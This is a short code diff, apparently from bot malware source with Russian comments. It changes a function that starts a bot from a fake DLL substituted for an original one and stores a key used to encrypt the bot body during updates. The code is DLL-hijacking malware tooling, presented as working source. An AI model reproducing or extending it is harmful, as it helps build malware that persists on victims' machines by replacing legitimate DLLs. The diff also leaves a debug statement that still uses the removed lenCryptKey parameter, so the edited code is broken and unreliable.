@@ -307,9 +307,9 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 // pathBotPlug - путь в котором находится этот бот
 // pathFakeDll - путь к fake.dll 
 // pathOrigDll - путь к длл которую подменили на fake.dll
-// cryptKey, lenCryptKey - ключ и длина ключа для шифрования тела бота при обновлении
+// cryptKey - ключ для шифрования тела бота при обновлении (строковая строка)
 // эти параметры необходимы для удаления и обновления бота
-BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey, int lenCryptKey )
+BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey )
 {
 //	BOT::Initialize();
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );
@@ -317,9 +317,9 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 	m_lstrcpy( FakeDllPathBot, pathBotPlug );
 	m_lstrcpy( FakeDllPathDll, pathFakeDll );
 	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
-	m_memcpy( FakeDllCryptKey, cryptKey, lenCryptKey );
-	FakeDllLenCryptKey = lenCryptKey;
-	FakeDllCryptKey[lenCryptKey] = 0;
+	FakeDllLenCryptKey = m_lstrlen(cryptKey);
+	m_memcpy( FakeDllCryptKey, cryptKey, FakeDllLenCryptKey );
+	FakeDllCryptKey[FakeDllLenCryptKey] = 0;
 
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s', len key: %d", cryptKey, lenCryptKey );
 
